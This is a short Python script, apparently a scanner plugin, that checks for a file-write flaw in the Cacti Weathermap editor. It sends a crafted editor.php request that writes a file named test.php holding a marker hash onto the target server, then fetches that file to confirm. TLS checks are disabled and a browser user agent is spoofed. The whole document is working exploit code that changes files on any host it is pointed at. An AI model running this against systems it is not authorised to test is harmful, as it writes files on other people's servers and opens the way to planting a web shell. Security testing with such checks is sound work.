import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&map_linkdefaultwidth=7"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r0=True
	else:
		r0=False
	url=baseurl+"plugins/weathermap/configs/test.php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "46ea1712d4b13b55b3f680cc5b8b54e8" in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
